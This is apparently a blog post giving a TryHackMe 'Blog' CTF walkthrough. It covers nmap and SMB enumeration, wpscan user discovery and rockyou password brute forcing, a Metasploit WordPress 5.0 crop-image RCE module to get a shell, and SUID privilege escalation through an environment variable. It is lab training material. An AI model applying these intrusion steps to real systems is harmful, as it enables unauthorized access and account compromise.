---
layout: post
title: Blog - coming soon
date:   2025-10-30 11:05
description: TryHackMe CTF Write-Up
tags: tryhackme 
comments: false
---
[Link To CTF](https://tryhackme.com/room/blog)
-TRYHACKME CTF WRITEUP-
<br>
<br>
<br>
## Starting with an nmap scan, we see: 

******1
<br>

## Let's do an SMB scan to check for any shares
## smbmap shows:

******2

<br>
{% highlight bash %}
"***SMB rabbit Hole***
Navingating into the SMB share,
I found 2 images and 1 mp4 audio file
I download all 3

This turned out to be a rabbit hole
Alice-white-rabbit: says rabbit hole
tswift: is a taylor swift music video
check-this: shows a QR Code that opens a billy joel music vido 

*** Looks like SMB was a dead end ***"
{% endhighlight bash %}
<br>

## This machine details that a wordpress blog is being used
## lets check it out with a wpscan:
{% highlight bash %}
wpscan --update                   - update
wpscan --url <target_IP> -e vp,vt,u  -full scan 
{% endhighlight bash %}

******3
<br>

## Performing a full scan shows usernames: bjoel, kwheel
******4
<br>

## We can brute force passwords for these usernames 
wpscan --url http://<target_IP> --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
******5

## We get Karen Wheelers username and password
Username: kwheel
Password: cutiepie1[redacted]
******5
<br>

## We now need to find the login page
## Looking at robots.txt: 
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

## We find the login page at: /wp-admin/

<br>
## This is WordPress version 5.0
## By googling, we find out that there is a known vulnerability:
## "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",

<br>
## Searching WordPress 5.0 on Metasploit we can run the 1st option
> 0   exploit/multi/http/wp_crop_rce   
>enter: USERNAME PASSWORD RHOST AND LHOST AND LPORT

<br>
## We get a meterpreter shell as www-data

<br>
## Looking for the user flag, we see it's not where we think it is:


<br>
## Looking for clues we see a termination letter


<br>
## The company is "rubber ducky" and billy joel was let go for illegal use of removable media
## Say no more, let's check /media/usb
## Denied !

## We will need to escalate our privileges
Let try searching binaries with the SUID bit set: 
find / -type f -perm -04000 -ls 2>/dev/null 

<br>
## We see something interesting:
/usr/sbin/checker

## This is a root owned binary, with SUID flag on
## It gets the "admin" environment variable and prints out "Not an Admin".

********

## Let's see if we can set this environment variable

$ export admin=1
$ ltrace checker

<br>

## Now it tries to run bash as root
## When we run again:
/usr/sbin/checker

## We now get root and see the user flag where we tried to look before

*************

## We also now get root flag 

*************













